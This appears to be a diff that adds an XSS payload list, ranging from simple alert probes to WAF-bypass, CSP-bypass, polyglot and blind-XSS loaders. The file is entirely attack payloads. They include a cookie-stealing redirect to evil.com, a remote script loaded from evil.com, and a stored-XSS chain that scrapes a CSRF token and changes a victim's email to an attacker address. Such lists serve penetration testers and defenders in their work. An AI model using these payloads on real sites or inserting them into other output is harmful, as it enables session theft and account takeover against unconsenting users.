@@ -1,0 +1,65 @@
+# XSS Payloads — basic to WAF-bypass
+# Source: XSSRush + XSS-Rat 2026 guide + manual additions
+
+# ── Basic ────────────────────────────────────────────────────────────────────
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input autofocus onfocus=alert(1)>
+
+# ── Template / framework injection ──────────────────────────────────────────
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+#{alert(1)}
+
+# ── WAF bypass — encoding ────────────────────────────────────────────────────
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<a href="jav&#x09;ascript:alert(1)">x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+<a href="jav&#x0D;ascript:alert(1)">x</a>
+<svg/onload=alert`1`>
+<svg/onload=\u0061lert(1)>
+
+# ── WAF bypass — whitespace tricks ──────────────────────────────────────────
+<img/src=x/onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>
+
+# ── DOM-based payloads ───────────────────────────────────────────────────────
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'
+#"><img src=x onerror=alert(1)>
+';alert(String.fromCharCode(88,83,83))//
+\';alert(1)//
+
+# ── CSP bypass ───────────────────────────────────────────────────────────────
+<link rel=import href="data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
+<object data="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+
+# ── Polyglots ────────────────────────────────────────────────────────────────
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'"--><svg onload=alert(1)>
+</textarea><svg onload=alert(1)>
+
+# ── Blind XSS (use your XSS Hunter URL) ─────────────────────────────────────
+<script src="https://YOUR_XSSHUNTER.xss.ht"></script>
+"><script src="https://YOUR_XSSHUNTER.xss.ht"></script>
+'"><img src=x onerror="var s=document.createElement('script');s.src='https://YOUR_XSSHUNTER.xss.ht';document.head.appendChild(s)">
+
+# ── Account Takeover chain ───────────────────────────────────────────────────
+# Stored XSS → steal session (HttpOnly=false)
+<script>document.location='https://evil.com/?c='+document.cookie</script>
+
+# Stored XSS → email change (CSRF chain)
+<script>
+fetch('/settings').then(r=>r.text()).then(h=>{
+  const t=h.match(/csrf[_-]?token["' ]*[:=]["' ]*([^"' >]+)/i);
+  if(t)fetch('/settings/email',{method:'POST',credentials:'include',
+  headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'email=attacker@evil.com&csrf_token='+t[1]});
+});
+</script>
